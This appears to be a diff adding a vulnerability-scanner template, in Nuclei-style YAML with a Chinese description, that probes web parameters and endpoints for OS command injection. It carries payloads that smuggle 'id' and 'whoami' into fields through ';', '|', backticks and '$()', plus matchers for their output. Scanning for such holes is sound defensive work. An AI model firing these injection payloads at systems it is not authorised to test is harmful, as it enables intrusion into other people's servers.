@@ -1,0 +1,108 @@
+id: command-injection
+info:
+  name: OS Command Injection
+  severity: Critical
+  description: |
+    检测操作系统命令注入漏洞，通过注入系统命令尝试在服务器上执行任意命令。
+    覆盖多种注入方式和操作系统。
+  tags:
+    - command-injection
+    - rce
+    - injection
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd={{payload}}"
+      - "{{BaseURL}}/?exec={{payload}}"
+      - "{{BaseURL}}/?command={{payload}}"
+      - "{{BaseURL}}/?ping={{payload}}"
+      - "{{BaseURL}}/?host={{payload}}"
+      - "{{BaseURL}}/?ip={{payload}}"
+      - "{{BaseURL}}/?domain={{payload}}"
+      - "{{BaseURL}}/?action={{payload}}"
+      - "{{BaseURL}}/?query={{payload}}"
+      - "{{BaseURL}}/?file={{payload}}"
+      - "{{BaseURL}}/?dir={{payload}}"
+      - "{{BaseURL}}/?name={{payload}}"
+    payload_sets:
+      default:
+        - "127.0.0.1;id"
+        - "127.0.0.1|id"
+        - "127.0.0.1`id`"
+        - "127.0.0.1$(id)"
+        - ";id;"
+        - "|id|"
+        - "`id`"
+        - "$(id)"
+        - "&id"
+        - "||id"
+        - "&&id"
+      windows:
+        - "127.0.0.1&whoami"
+        - "127.0.0.1|whoami"
+        - "&whoami"
+        - "|whoami"
+        - "^whoami"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+          - "root"
+          - "nobody"
+          - "www-data"
+          - "apache"
+          - "nginx"
+          - "daemon"
+          - "\\administrator"
+          - "NT AUTHORITY"
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)\\s+groups=.*"
+          - "[a-zA-Z]:\\\\[Uu]sers\\\\"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/ping"
+      - "{{BaseURL}}/lookup"
+      - "{{BaseURL}}/api/ping"
+      - "{{BaseURL}}/api/lookup"
+      - "{{BaseURL}}/api/exec"
+      - "{{BaseURL}}/api/command"
+      - "{{BaseURL}}/tools/ping"
+      - "{{BaseURL}}/tools/lookup"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "host={{payload}}&submit=Ping"
+    payload_sets:
+      default:
+        - "127.0.0.1;id"
+        - "127.0.0.1|id"
+        - "127.0.0.1`id`"
+        - "127.0.0.1$(id)"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+          - "www-data"
+          - "apache"
+          - "nobody"
+          - "NT AUTHORITY"
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+\\)\\s+gid=\\d+\\(\\w+\\)"
+        part: body
